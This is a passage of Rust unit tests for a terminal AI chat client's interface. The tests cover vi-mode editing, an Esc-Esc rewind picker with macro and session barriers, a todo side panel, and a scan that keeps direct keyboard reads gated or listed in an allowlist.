        harness.type_text("qz");
        assert_eq!(
            harness.app.composer_text(),
            "e o",
            "unbound letters are swallowed"
        );
        harness.type_text("dd");
        assert_eq!(harness.app.composer_text(), "");
        harness.type_text("i");
        assert_eq!(harness.app.vi_mode, Some(ViMode::Insert));
        harness.type_text("abc");
        assert_eq!(harness.app.composer_text(), "abc");
        assert!(!harness.draw().contains(composer::NORMAL_TAG));
        harness.press(KeyCode::Esc);
        harness.type_text("Ad");
        assert_eq!(harness.app.composer_text(), "abcd");
        harness.press(KeyCode::Esc);
        harness.type_text("0aX");
        assert_eq!(harness.app.composer_text(), "aXbcd");
        harness.press(KeyCode::Esc);
        assert_eq!(
            harness.press(KeyCode::Enter),
            Some(Command::Submit("aXbcd".to_string()))
        );
        assert_eq!(
            harness.app.vi_mode,
            Some(ViMode::Insert),
            "a sent line starts the next in insert"
        );
    }

    #[test]
    fn a_lone_d_is_forgotten_by_the_next_key_and_j_k_move_between_lines() {
        let mut harness = vi_harness();
        harness.type_text("top");
        harness
            .app
            .handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::SHIFT));
        harness.type_text("bottom");
        harness.press(KeyCode::Esc);
        harness.type_text("hdxd");
        assert_eq!(harness.app.composer_text(), "top\nbotto");
        harness.type_text("k0dd");
        assert_eq!(harness.app.composer_text(), "botto");
        harness.type_text("jdd");
        assert_eq!(harness.app.composer_text(), "");
    }

    #[test]
    fn vi_esc_still_interrupts_a_turn_and_closes_a_popup_first() {
        let mut harness = vi_harness();
        harness.app.begin_turn("hello", false);
        harness.type_text("draft");
        assert_eq!(harness.press(KeyCode::Esc), Some(Command::Interrupt));
        assert_eq!(harness.app.vi_mode, Some(ViMode::Insert));
        harness.app.end_turn(false, &TurnOutcome::default());
        harness.app.set_composer_text(".in");
        harness.app.refresh_palette(None);
        assert!(palette(&harness).is_some());
        assert_eq!(harness.press(KeyCode::Esc), None);
        assert!(palette(&harness).is_none());
        assert_eq!(harness.app.vi_mode, Some(ViMode::Insert));
        assert_eq!(harness.press(KeyCode::Esc), None);
        assert_eq!(harness.app.vi_mode, Some(ViMode::Normal));
    }

    #[test]
    fn rewind_exchanges_pops_the_newest_exchanges_and_counts_how_far_it_got() {
        let mut ctx = chat_ctx();
        let mut session = Session::default();
        for prompt in ["first", "second", "third"] {
            let input = Input::from_str(&ctx, prompt, None).unwrap();
            session.add_message(&input, "reply").unwrap();
        }
        ctx.session = Some(session);
        let (popped, stopped) = rewind_exchanges(&mut ctx, 2);
        assert_eq!(popped, 2);
        assert!(stopped.is_none());
        let session = ctx.session.as_ref().unwrap();
        let prompts: Vec<&str> = session
            .messages()
            .iter()
            .filter(|m| m.role.is_user())
            .filter_map(|m| m.content.as_text())
            .collect();
        assert_eq!(prompts, ["first"]);
        assert_eq!(ctx.pending_prefill.as_deref(), Some("second"));

        let (popped, stopped) = rewind_exchanges(&mut ctx, 3);
        assert_eq!(popped, 1);
        let err = stopped.expect("the second pop finds nothing");
        assert!(err.to_string().contains("Nothing to undo"), "{err}");
        assert!(!ctx.session.as_ref().unwrap().has_user_messages());
        assert_eq!(ctx.pending_prefill.as_deref(), Some("first"));

        ctx.session = None;
        let (popped, stopped) = rewind_exchanges(&mut ctx, 1);
        assert_eq!(popped, 0);
        let err = stopped.expect("no session to pop from");
        assert!(err.to_string().contains("No session"), "{err}");
    }

    fn rewind(harness: &Harness) -> Option<&RewindState> {
        match &harness.app.view {
            View::Rewind(rewind) => Some(rewind),
            _ => None,
        }
    }

    fn three_exchanges(harness: &mut Harness) {
        for question in ["first question", "second\nwith detail", "third question"] {
            harness.app.begin_turn(question, false);
            harness
                .app
                .handle_msg(UiMsg::AssistantText("an answer".to_string()));
            harness.app.end_turn(false, &TurnOutcome::default());
        }
    }

    #[test]
    fn esc_esc_on_an_empty_idle_composer_opens_the_rewind_picker_newest_first() {
        let mut harness = Harness::standalone(80, 24);
        three_exchanges(&mut harness);
        assert_eq!(harness.press(KeyCode::Esc), None);
        assert!(rewind(&harness).is_none(), "one Esc is not enough");
        assert_eq!(harness.press(KeyCode::Esc), None);
        let picker = rewind(&harness).expect("the second Esc opens it");
        let titles: Vec<(usize, &str)> = picker
            .rows
            .iter()
            .map(|row| (row.opener, row.title.as_str()))
            .collect();
        assert_eq!(
            titles,
            [
                (4, "third question"),
                (2, "second\nwith detail"),
                (0, "first question"),
            ]
        );
        assert_eq!(picker.highlight, 0);
        let frame = harness.draw();
        assert_welcome_snapshot("rewind_picker_80x24", &frame);
        assert!(frame.contains("third question"), "{frame}");
        assert!(frame.contains("+1 line"), "{frame}");
        harness.press(KeyCode::Down);
        let Some(Command::Rewind(target)) = harness.press(KeyCode::Enter) else {
            panic!("the second row rewinds two exchanges");
        };
        let rows: Vec<(usize, &str)> = target
            .rows
            .iter()
            .map(|row| (row.opener, row.title.as_str()))
            .collect();
        assert_eq!(rows, [(4, "third question"), (2, "second\nwith detail")]);
        assert!(rewind(&harness).is_none());
    }

    #[test]
    fn esc_esc_does_not_open_the_picker_when_anything_outranks_it() {
        let mut harness = Harness::standalone(80, 24);
        harness.press(KeyCode::Esc);
        harness.press(KeyCode::Esc);
        assert!(rewind(&harness).is_none(), "nothing to rewind to");

        three_exchanges(&mut harness);
        harness.type_text("typed");
        harness.press(KeyCode::Esc);
        harness.press(KeyCode::Esc);
        assert!(rewind(&harness).is_none(), "a draft");
        harness.app.set_composer_text("");

        harness.press(KeyCode::Esc);
        harness
            .clock
            .advance(REWIND_ESC_GAP + Duration::from_millis(1));
        harness.press(KeyCode::Esc);
        assert!(rewind(&harness).is_none(), "too far apart");
        harness
            .clock
            .advance(REWIND_ESC_GAP + Duration::from_millis(1));

        harness.app.begin_turn("running", false);
        assert_eq!(harness.press(KeyCode::Esc), Some(Command::Interrupt));
        assert_eq!(harness.press(KeyCode::Esc), Some(Command::Interrupt));
        assert!(rewind(&harness).is_none(), "a turn");
        harness.app.end_turn(false, &TurnOutcome::default());

        harness.type_text(".in");
        assert!(palette(&harness).is_some());
        harness.press(KeyCode::Esc);
        harness.app.set_composer_text("");
        harness.press(KeyCode::Esc);
        assert!(
            rewind(&harness).is_none(),
            "closing the palette is not an idle Esc"
        );

        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        harness.press(KeyCode::Esc);
        assert!(matches!(asker.join().unwrap(), Ok(PromptAnswer::Cancelled)));
        harness.press(KeyCode::Esc);
        assert!(
            rewind(&harness).is_none(),
            "cancelling a modal is not an idle Esc"
        );

        harness.press(KeyCode::Esc);
        assert!(rewind(&harness).is_some(), "two idle Escs in a row open it");
        assert_eq!(harness.press(KeyCode::Esc), None);
        assert!(rewind(&harness).is_none(), "Esc closes it");
        assert_eq!(harness.app.composer_text(), "");
    }

    #[test]
    fn under_vi_the_picker_opens_from_normal_mode() {
        let mut harness = vi_harness();
        three_exchanges(&mut harness);
        harness.press(KeyCode::Esc);
        assert_eq!(harness.app.vi_mode, Some(ViMode::Normal));
        harness.press(KeyCode::Esc);
        assert!(rewind(&harness).is_none(), "the first Esc only left insert");
        harness.press(KeyCode::Esc);
        assert!(rewind(&harness).is_some());
        harness.press(KeyCode::Enter);
        assert!(rewind(&harness).is_none());
    }

    /// Opens the picker on an idle composer and takes the row `down`
    /// steps below the newest.
    fn choose_rewind(harness: &mut Harness, down: usize) -> RewindTarget {
        harness.press(KeyCode::Esc);
        harness.press(KeyCode::Esc);
        for _ in 0..down {
            harness.press(KeyCode::Down);
        }
        match harness.press(KeyCode::Enter) {
            Some(Command::Rewind(target)) => target,
            other => panic!("the row did not rewind: {other:?}"),
        }
    }

    #[test]
    fn a_rewind_command_pops_the_session_and_truncates_the_transcript() {
        let mut ctx = chat_ctx();
        let mut session = Session::default();
        for prompt in ["first question", "second\nwith detail", "third question"] {
            let input = Input::from_str(&ctx, prompt, None).unwrap();
            session.add_message(&input, "an answer").unwrap();
        }
        ctx.session = Some(session);
        let mut harness = Harness::for_ctx(&ctx);
        three_exchanges(&mut harness);
        assert_eq!(harness.app.transcript.len(), 6);
        let target = choose_rewind(&mut harness, 1);
        apply_rewind(&mut harness.app, &mut ctx, target);
        assert_eq!(harness.app.transcript.len(), 2);
        assert_eq!(harness.app.composer_text(), "second\nwith detail");
        assert_eq!(ctx.pending_prefill, None);
        let session = ctx.session.as_ref().unwrap();
        assert_eq!(
            session
                .messages()
                .iter()
                .filter(|m| m.role.is_user())
                .count(),
            1
        );
        assert!(!harness.draw().contains("Rewind stopped"));
    }

    /// A dry run keeps no session, so the prefill cannot come from a pop:
    /// the chosen row's own text is what the composer gets, and the
    /// transcript goes back to it all the same.
    #[test]
    fn a_rewind_without_a_session_still_truncates_and_prefills_the_chosen_prompt() {
        let mut ctx = chat_ctx();
        assert!(ctx.session.is_none());
        let mut harness = Harness::for_ctx(&ctx);
        three_exchanges(&mut harness);
        let target = choose_rewind(&mut harness, 1);
        apply_rewind(&mut harness.app, &mut ctx, target);
        assert_eq!(harness.app.transcript.len(), 2);
        assert_eq!(harness.app.composer_text(), "second\nwith detail");
        assert!(!harness.draw().contains("Rewind stopped"));
    }

    /// A session shorter than the transcript is popped as far as it goes
    /// and the transcript cut back only that far, with a notice.
    #[test]
    fn a_rewind_the_session_cannot_finish_stops_where_the_session_did() {
        let mut ctx = chat_ctx();
        let mut session = Session::default();
        let input = Input::from_str(&ctx, "third question", None).unwrap();
        session.add_message(&input, "an answer").unwrap();
        ctx.session = Some(session);
        let mut harness = Harness::for_ctx(&ctx);
        three_exchanges(&mut harness);
        let target = choose_rewind(&mut harness, 1);
        apply_rewind(&mut harness.app, &mut ctx, target);
        assert_eq!(
            harness.app.transcript.len(),
            5,
            "two exchanges stay and the notice follows them"
        );
        assert_eq!(harness.app.composer_text(), "third question");
        assert!(!ctx.session.as_ref().unwrap().has_user_messages());
        let frame = harness.draw();
        assert!(frame.contains("Rewind stopped: Nothing to undo"), "{frame}");
    }

    /// A macro's one transcript row stands for every exchange it ran, so
    /// the picker offers only the rows above it: popping one exchange per
    /// offered row leaves the session holding exactly what the transcript
    /// still shows.
    #[test]
    fn a_rewind_above_a_macro_row_pops_one_exchange_per_offered_row() {
        let mut ctx = chat_ctx();
        let mut session = Session::default();
        for prompt in [
            "first question",
            "macro step one",
            "macro step two",
            "third question",
        ] {
            let input = Input::from_str(&ctx, prompt, None).unwrap();
            session.add_message(&input, "an answer").unwrap();
        }
        ctx.session = Some(session);
        let mut harness = Harness::for_ctx(&ctx);
        harness.app.macros = vec![("deploy".to_string(), "ship it".to_string())];
        for (line, command) in [
            ("first question", false),
            (".deploy prod", true),
            ("third question", false),
        ] {
            harness.app.begin_turn(line, command);
            harness
                .app
                .handle_msg(UiMsg::AssistantText("an answer".to_string()));
            harness.app.end_turn(command, &TurnOutcome::default());
        }
        assert_eq!(harness.app.transcript.len(), 6);
        harness.press(KeyCode::Esc);
        harness.press(KeyCode::Esc);
        let picker = rewind(&harness).expect("the newest row is offered");
        assert_eq!(
            picker.rows.len(),
            1,
            "nothing at or below the macro is offered"
        );
        let frame = harness.draw();
        assert!(
            frame.contains("Rewind stops at the last macro turn"),
            "{frame}"
        );
        let target = match harness.press(KeyCode::Enter) {
            Some(Command::Rewind(target)) => target,
            other => panic!("the row did not rewind: {other:?}"),
        };
        apply_rewind(&mut harness.app, &mut ctx, target);
        let cells = harness.app.transcript.cells();
        assert!(matches!(&cells[2], Cell::Command { name, .. } if name == ".deploy prod"));
        assert!(
            !cells
                .iter()
                .any(|cell| matches!(cell, Cell::User { text, .. } if text == "third question"))
        );
        assert_eq!(harness.app.composer_text(), "third question");
        let session = ctx.session.as_ref().unwrap();
        let prompts: Vec<&str> = session
            .messages()
            .iter()
            .filter(|m| m.role.is_user())
            .filter_map(|m| m.content.as_text())
            .collect();
        assert_eq!(
            prompts,
            ["first question", "macro step one", "macro step two"],
            "the macro's exchanges stay in the session as its row stays in the transcript"
        );
        assert!(!harness.draw().contains("Rewind stopped"));
    }

    #[test]
    fn a_rewind_barrier_is_read_from_the_command_word_and_the_enabled_macros() {
        let deploy = [("deploy".to_string(), "ship it".to_string())];
        let dot = crate::config::CommandPrefix::Dot;
        assert_eq!(
            rewind_barrier(".deploy prod", dot, &deploy),
            Some(RewindBarrier::Macro)
        );
        assert_eq!(rewind_barrier(".deploy prod", dot, &[]), None);
        assert_eq!(
            rewind_barrier(".macro deploy", dot, &[]),
            Some(RewindBarrier::Macro)
        );
        assert_eq!(rewind_barrier(".macro enable deploy", dot, &deploy), None);
        assert_eq!(rewind_barrier(".macro disable deploy", dot, &deploy), None);
        assert_eq!(rewind_barrier(".macro", dot, &deploy), None);
        assert_eq!(
            rewind_barrier(".session other", dot, &[]),
            Some(RewindBarrier::Session)
        );
        assert_eq!(
            rewind_barrier(".agent coder", dot, &[]),
            Some(RewindBarrier::Session)
        );
        assert_eq!(rewind_barrier(".agent", dot, &[]), None);
        assert_eq!(
            rewind_barrier(".exit session", dot, &[]),
            Some(RewindBarrier::Session)
        );
        assert_eq!(
            rewind_barrier(".empty session", dot, &[]),
            Some(RewindBarrier::Session)
        );
        assert_eq!(
            rewind_barrier(".edit session", dot, &[]),
            Some(RewindBarrier::Session)
        );
        assert_eq!(rewind_barrier(".edit role", dot, &[]), None);
        assert_eq!(rewind_barrier(".exit role", dot, &[]), None);
        assert_eq!(rewind_barrier(".info", dot, &[]), None);
        assert_eq!(rewind_barrier("plain words", dot, &deploy), None);
        assert_eq!(
            rewind_barrier("/session other", crate::config::CommandPrefix::Slash, &[]),
            Some(RewindBarrier::Session)
        );
    }

    /// The barrier is committed with the cell: disabling the macro
    /// afterwards does not let the picker count past the turn it ran,
    /// and a session swap, which opened no exchange, stops it the same
    /// way with its own notice.
    #[test]
    fn the_picker_stops_at_a_barrier_committed_before_the_macros_changed() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.macros = vec![("deploy".to_string(), "ship it".to_string())];
        for (line, command) in [
            ("first question", false),
            (".deploy prod", true),
            ("third question", false),
        ] {
            harness.app.begin_turn(line, command);
            harness
                .app
                .handle_msg(UiMsg::AssistantText("an answer".to_string()));
            harness.app.end_turn(command, &TurnOutcome::default());
        }
        harness.app.macros.clear();
        harness.press(KeyCode::Esc);
        harness.press(KeyCode::Esc);
        assert_eq!(rewind(&harness).map(|picker| picker.rows.len()), Some(1));
        let frame = harness.draw();
        assert!(
            frame.contains("Rewind stops at the last macro turn"),
            "{frame}"
        );
        harness.press(KeyCode::Esc);

        harness.app.begin_turn(".session other", true);
        harness.app.end_turn(true, &TurnOutcome::default());
        harness.app.begin_turn("fourth question", false);
        harness
            .app
            .handle_msg(UiMsg::AssistantText("an answer".to_string()));
        harness.app.end_turn(false, &TurnOutcome::default());
        harness.press(KeyCode::Esc);
        harness.press(KeyCode::Esc);
        let picker = rewind(&harness).expect("the row above the swap is offered");
        assert_eq!(
            picker
                .rows
                .iter()
                .map(|row| row.title.as_str())
                .collect::<Vec<_>>(),
            ["fourth question"]
        );
        assert!(matches!(
            harness.app.transcript.cells().last(),
            Some(Cell::Notice { text, .. }) if text == "Rewind stops at the last session command"
        ));
    }

    /// A session command that failed left the context as it was, so its
    /// cell carries no barrier and the picker counts past it.
    #[test]
    fn a_failed_session_command_is_not_a_barrier() {
        let mut harness = Harness::standalone(80, 24);
        exchange(&mut harness);
        harness.app.begin_turn(".session nosuch", true);
        harness.app.end_turn(
            true,
            &TurnOutcome {
                error: Some("session not found".to_string()),
                ..TurnOutcome::default()
            },
        );
        assert!(matches!(
            &harness.app.transcript.cells()[3],
            Cell::Command {
                name,
                rewind_barrier: None,
                ..
            } if name == ".session nosuch"
        ));
        harness.press(KeyCode::Esc);
        harness.press(KeyCode::Esc);
        assert_eq!(rewind(&harness).map(|picker| picker.rows.len()), Some(1));
    }

    /// A macro that failed at a later step already recorded the exchanges
    /// before it, so its cell is a barrier like a macro that finished.
    #[test]
    fn a_macro_that_asked_the_model_is_a_barrier_even_when_it_failed_later() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.macros = vec![("deploy".to_string(), "ship it".to_string())];
        exchange(&mut harness);
        harness.app.begin_turn(".deploy prod", true);
        harness
            .app
            .handle_msg(UiMsg::AssistantText("step one done".to_string()));
        harness.app.end_turn(
            true,
            &TurnOutcome {
                error: Some("step two failed".to_string()),
                ..TurnOutcome::default()
            },
        );
        assert!(matches!(
            &harness.app.transcript.cells()[3],
            Cell::Command {
                name,
                rewind_barrier: Some(RewindBarrier::Macro),
                ..
            } if name == ".deploy prod"
        ));
        harness.press(KeyCode::Esc);
        harness.press(KeyCode::Esc);
        assert!(rewind(&harness).is_none());
        assert!(matches!(
            harness.app.transcript.cells().last(),
            Some(Cell::Notice { text, .. }) if text == "Rewind stops at the last macro turn"
        ));
    }

    #[test]
    fn f2_shows_the_todo_panel_beside_the_transcript_and_hides_it_again() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("plan it", false);
        harness
            .app
            .todo
            .set("ship the panel".to_string(), Vec::new());
        harness.app.handle_msg(UiMsg::TodoUpdated(todo_items()));
        harness
            .app
            .handle_msg(UiMsg::AssistantText("Working through it.".to_string()));
        harness.app.end_turn(false, &TurnOutcome::default());
        assert!(harness.press(KeyCode::F(2)).is_none());
        let frame = harness.draw();
        insta::assert_snapshot!("todo_panel_80x24", &frame);
        for text in [
            "Todo",
            "ship the panel",
            "[x] wire the panel",
            "[ ] snapshot it narrow",
            "Working through it.",
        ] {
            assert!(frame.contains(text), "{text:?} missing:\n{frame}");
        }
        harness.press(KeyCode::F(2));
        let frame = harness.draw();
        assert!(!frame.contains("Todo"), "{frame}");
        assert!(frame.contains("Working through it."), "{frame}");
    }

    #[test]
    fn on_a_narrow_frame_the_todo_panel_takes_the_transcripts_place() {
        let mut harness = Harness::standalone(40, 20);
        harness.app.begin_turn("plan it", false);
        harness.app.handle_msg(UiMsg::TodoUpdated(todo_items()));
        harness
            .app
            .handle_msg(UiMsg::AssistantText("Working through it.".to_string()));
        harness.app.end_turn(false, &TurnOutcome::default());
        harness.press(KeyCode::F(2));
        let frame = harness.draw();
        insta::assert_snapshot!("todo_panel_40x20", &frame);
        assert!(frame.contains("[ ] snapshot it narrow"), "{frame}");
        assert!(!frame.contains("Working through it."), "{frame}");
    }

    #[test]
    fn the_welcome_block_greets_an_empty_transcript_until_the_first_turn() {
        let mut harness = Harness::standalone(80, 24);
        let frame = harness.draw();
        assert_welcome_snapshot("welcome_80x24", &frame);
        assert!(frame.contains(concat!("coyote ", env!("CARGO_PKG_VERSION"))));
        assert!(frame.contains("model: openai:test-model"));
        harness.type_text("hello there");
        let frame = harness.draw();
        assert!(
            frame.contains("Tip: Press"),
            "typing removed the welcome:\n{frame}"
        );
        harness.app.begin_turn("hi", false);
        let frame = harness.draw();
        assert!(!frame.contains("Tip: Press"), "{frame}");
        harness
            .app
            .handle_msg(UiMsg::AssistantText("hello".to_string()));
        harness.app.end_turn(false, &TurnOutcome::default());
        let frame = harness.draw();
        assert!(!frame.contains("Tip: Press"), "{frame}");
        assert!(
            !harness
                .app
                .transcript
                .cells()
                .iter()
                .any(|cell| matches!(cell, Cell::Welcome { .. }))
        );

        let mut narrow = Harness::standalone(40, 20);
        assert_welcome_snapshot("welcome_40x20", &narrow.draw());
    }

    #[test]
    fn esc_on_a_focused_row_interrupts_the_running_turn_and_drops_the_focus() {
        let mut harness = Harness::standalone(80, 24);
        running_fs_read(&mut harness);
        finish_tool(&mut harness, "call-1", true, None);
        harness.app.handle_key(ctrl(KeyCode::Up));
        assert!(harness.app.transcript.focused());
        assert_eq!(harness.press(KeyCode::Esc), Some(Command::Interrupt));
        assert!(!harness.app.transcript.focused());
    }

    /// A submitted line is a new context: the focus goes when the line
    /// leaves the composer and again when its turn begins, so the Esc
    /// that follows reaches the turn.
    #[test]
    fn a_submitted_line_drops_the_focus_so_esc_interrupts_its_turn() {
        let mut harness = Harness::standalone(80, 24);
        running_fs_read(&mut harness);
        finish_tool(&mut harness, "call-1", true, None);
        harness.app.end_turn(false, &TurnOutcome::default());
        harness.app.handle_key(ctrl(KeyCode::Up));
        assert!(harness.app.transcript.focused());
        harness.type_text("next question");
        assert_eq!(
            harness.press(KeyCode::Enter),
            Some(Command::Submit("next question".to_string()))
        );
        assert!(!harness.app.transcript.focused());

        harness.app.handle_key(ctrl(KeyCode::Up));
        assert!(harness.app.transcript.focused());
        harness.app.begin_turn("next question", false);
        assert!(!harness.app.transcript.focused());
        assert_eq!(harness.press(KeyCode::Esc), Some(Command::Interrupt));
        assert!(!harness.app.transcript.focused());
    }

    #[test]
    fn enter_with_a_focused_row_and_a_draft_still_submits() {
        let mut harness = Harness::standalone(80, 24);
        running_fs_read(&mut harness);
        finish_tool(&mut harness, "call-1", true, None);
        harness.app.end_turn(false, &TurnOutcome::default());
        harness.app.handle_key(ctrl(KeyCode::Up));
        harness.type_text("next question");
        assert_eq!(
            harness.press(KeyCode::Enter),
            Some(Command::Submit("next question".to_string()))
        );
        assert!(matches!(
            &harness.app.transcript.cells()[1],
            Cell::Tool {
                expanded: false,
                ..
            }
        ));
    }

    /// With a modal up the strip's interrupt hint would contradict the
    /// modal's own `Esc = cancel`. The hint also names what Enter answers,
    /// which follows the request's default.
    #[test]
    fn the_interrupt_hint_yields_to_an_open_modal() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("ask", false);
        assert!(harness.draw().contains("Esc to interrupt"));
        let _asker = ask_on_a_thread(&mut harness, confirm_request(None));
        let rendered = harness.draw();
        assert!(!rendered.contains("Esc to interrupt"), "{rendered}");
        assert!(
            rendered.contains("y = yes  n = no  Enter = yes  Esc = cancel"),
            "{rendered}"
        );
        harness.clock.advance(HOTKEY_IDLE);
        harness.press(KeyCode::Esc);
        let _asker = ask_on_a_thread(&mut harness, confirm_request(Some("fs_write")));
        assert!(
            harness
                .draw()
                .contains("y = yes  n = no  a = yes for this session  Enter = yes  Esc = cancel")
        );
        harness.press(KeyCode::Esc);
        let no_by_default = PromptRequest {
            default: Some(serde_json::json!(false)),
            ..confirm_request(None)
        };
        let _asker = ask_on_a_thread(&mut harness, no_by_default);
        let rendered = harness.draw();
        assert!(rendered.contains("Enter = no"), "{rendered}");
        harness.press(KeyCode::Esc);
    }

    /// A terminal that never goes quiet cannot hold the loop after the
    /// editor: the flush stops at its limit.
    #[tokio::test]
    async fn the_typeahead_flush_stops_at_its_limit() {
        let mut polled = 0;
        let mut stream = futures_util::stream::repeat_with(|| {
            polled += 1;
            Ok::<_, std::io::Error>(crossterm::event::Event::FocusGained)
        });
        flush_typeahead(&mut stream).await;
        drop(stream);
        assert_eq!(polled, TYPEAHEAD_LIMIT);
    }

    fn fn_body<'a>(source: &'a str, signature: &str) -> &'a str {
        let start = source
            .find(signature)
            .unwrap_or_else(|| panic!("{signature} not found"));
        let body = &source[start..];
        &body[..body.find("\n}\n").unwrap()]
    }

    /// A `(file, function)` pair under `src/` whose body reads the
    /// keyboard directly, with whether that body checks the TUI flag.
    struct KeyboardReader {
        file: String,
        function: String,
        gated: bool,
        /// The body calls `ensure_prompts_available()` before its prompt.
        prompt_gated: bool,
    }

    /// The name on a `fn` line, if the line declares one.
    fn declared_fn(line: &str) -> Option<&str> {
        let mut rest = line.trim_start();
        if rest.starts_with("//") {
            return None;
        }
        loop {
            if let Some(after) = rest.strip_prefix("pub") {
                rest = match after.strip_prefix('(') {
                    Some(scoped) => &scoped[scoped.find(')')? + 1..],
                    None => after,
                }
                .trim_start();
            } else if let Some(after) = ["async ", "unsafe ", "const "]
                .iter()
                .find_map(|prefix| rest.strip_prefix(prefix))
            {
                rest = after;
            } else {
                break;
            }
        }
        let name = rest.strip_prefix("fn ")?;
        let end = name.find(['(', '<'])?;
        Some(&name[..end])
    }

    /// Every `.rs` file under `dir`, sorted.
    fn rust_files(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
        fn walk(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
            for entry in std::fs::read_dir(dir).unwrap().flatten() {
                let path = entry.path();
                if path.is_dir() {
                    walk(&path, out);
                } else if path.extension().is_some_and(|ext| ext == "rs") {
                    out.push(path);
                }
            }
        }
        let mut files = Vec::new();
        walk(dir, &mut files);
        files.sort();
        files
    }

    /// Every direct keyboard read outside this module: crossterm's
    /// `read`/`poll`, `read_single_key`, `edit_file` (which hands the tty
    /// to `$EDITOR`), `run_command` and `wait_for_status` (a child on the
    /// inherited tty), and inquire's prompt builders (nothing else under
    /// `src/` constructs a `Text`, `Select` or the like).
    fn keyboard_readers() -> Vec<KeyboardReader> {
        fn at_word_start(line: &str, at: usize) -> bool {
            line[..at]
                .chars()
                .next_back()
                .is_none_or(|c| !(c.is_alphanumeric() || c == '_'))
        }
        const NEEDLES: [&str; 12] = [
            "event::read(",
            "event::poll(",
            "read_single_key(",
            "edit_file(",
            "run_command(",
            "wait_for_status(",
            "wait_for_status_interruptible(",
            "Confirm::new(",
            "Select::new(",
            "MultiSelect::new(",
            "Text::new(",
            "Password::new(",
        ];
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        let src = root.join("src");
        let mut readers: Vec<KeyboardReader> = Vec::new();
        for path in rust_files(&src) {
            if path.starts_with(src.join("tui")) {
                continue;
            }
            let text = std::fs::read_to_string(&path).unwrap();
            let lines: Vec<&str> = text.lines().collect();
            for (index, line) in lines.iter().enumerate() {
                if line.trim_start().starts_with("//") {
                    continue;
                }
                let hit = NEEDLES.iter().any(|needle| {
                    line.match_indices(needle)
                        .any(|(at, _)| at_word_start(line, at))
                });
                if !hit {
                    continue;
                }
                let fn_index = (0..=index)
                    .rev()
                    .find(|i| declared_fn(lines[*i]).is_some())
                    .unwrap_or_else(|| {
                        panic!("{}:{} is outside any fn", path.display(), index + 1)
                    });
                let fn_line = lines[fn_index];
                let indent = &fn_line[..fn_line.len() - fn_line.trim_start().len()];
                let close = format!("{indent}}}");
                let body_end = (fn_index..lines.len())
                    .find(|i| lines[*i] == close || (*i == fn_index && fn_line.ends_with('}')))
                    .unwrap();
                let body = lines[fn_index..=body_end].join("\n");
                let file = path.strip_prefix(root).unwrap().display().to_string();
                let function = declared_fn(fn_line).unwrap().to_string();
                if readers
                    .iter()
                    .any(|r| r.file == file && r.function == function)
                {
                    continue;
                }
                // The prompt gate counts only ahead of the first prompt
                // builder in the body: a check after the question has
                // been asked guards nothing.
                let gate_at = body.find("ensure_prompts_available()");
                let first_builder = NEEDLES[7..]
                    .iter()
                    .filter_map(|needle| body.find(needle))
                    .min();
                readers.push(KeyboardReader {
                    gated: body.contains("crate::tui::active()"),
                    prompt_gated: gate_at
                        .is_some_and(|gate| first_builder.is_none_or(|builder| gate < builder)),
                    file,
                    function,
                });
            }
        }
        readers
    }

    /// Every direct keyboard reader outside this module either checks the
    /// TUI flag or is listed here with the reason it stays REPL-only, so
    /// a new reader cannot appear without a decision about the TUI. A
    /// `PROMPT_GATED` row is only honoured when the fn body really calls
    /// `ensure_prompts_available()`, and a body that does cannot hide
    /// under another reason.
    #[test]
    fn every_direct_keyboard_reader_is_gated_or_accounted_for() {
        const PROMPT_GATED: &str = "reachable from a REPL command; refuses through \
            ensure_prompts_available, routing through ctx.prompter is owned debt";
        const BEFORE_UI: &str = "first-run config wizard; runs before any UI starts";
        const CLI_ONLY: &str = "a CLI flow (-e, --mcp); the process never reaches a UI";
        const REPL_PROMPTER: &str =
            "the REPL's Prompter; the TUI seats TuiPrompter on ctx.prompter instead";
        const VIA_GATE: &str = "calls read_single_key, which refuses under the TUI";
        const VIA_EDIT_GATE: &str = "calls edit_file, which lends the terminal under the TUI";
        const VIA_RUN_GATE: &str = "calls run_command, which lends the terminal under the TUI";
        const REPL_PAINTER: &str =
            "polled by the spinner and the REPL stream painter, both replaced under the TUI";
        const NULL_STDIN: &str = "a unit test; the child it waits on has stdin at /dev/null";
        const LOADER_STDIN_CLOSED: &str =
            "a document loader; its child runs with stdin at /dev/null on every path";
        let allowlist: &[(&str, &str, &str)] = &[
            (
                "src/client/common.rs",
                "create_openai_compatible_client_config",
                BEFORE_UI,
            ),
            (
                "src/client/common.rs",
                "set_client_models_config",
                BEFORE_UI,
            ),
            ("src/client/common.rs", "select_model", BEFORE_UI),
            ("src/client/common.rs", "prompt_input_string", BEFORE_UI),
            ("src/client/macros.rs", "create_client_config", BEFORE_UI),
            ("src/config/agent.rs", "init_graph_rags", PROMPT_GATED),
            ("src/config/bundles.rs", "resolve_bundle_name", PROMPT_GATED),
            ("src/config/conflict.rs", "select_choice", PROMPT_GATED),
            (
                "src/config/install_remote.rs",
                "uninstall_bundle",
                PROMPT_GATED,
            ),
            (
                "src/config/install_remote.rs",
                "select_uninstall_candidate",
                PROMPT_GATED,
            ),
            (
                "src/config/install_remote.rs",
                "prompt_for_each_secret",
                PROMPT_GATED,
            ),
            ("src/config/mod.rs", "confirm_asset_overwrite", VIA_GATE),
            ("src/config/mod.rs", "create_config_file", BEFORE_UI),
            ("src/config/mod.rs", "create_config_file_sandbox", BEFORE_UI),
            (
                "src/config/request_context.rs",
                "edit_config",
                VIA_EDIT_GATE,
            ),
            (
                "src/config/request_context.rs",
                "edit_mcp_config",
                VIA_EDIT_GATE,
            ),
            (
                "src/config/request_context.rs",
                "edit_session",
                VIA_EDIT_GATE,
            ),
            (
                "src/config/request_context.rs",
                "edit_agent_config",
                VIA_EDIT_GATE,
            ),
            ("src/config/request_context.rs", "new_macro", VIA_EDIT_GATE),
            (
                "src/config/request_context.rs",
                "upsert_role",
                VIA_EDIT_GATE,
            ),
            (
                "src/config/request_context.rs",
                "upsert_skill",
                VIA_EDIT_GATE,
            ),
            (
                "src/config/request_context.rs",
                "edit_rag_docs",
                VIA_EDIT_GATE,
            ),
            ("src/config/update.rs", "run_self_update", PROMPT_GATED),
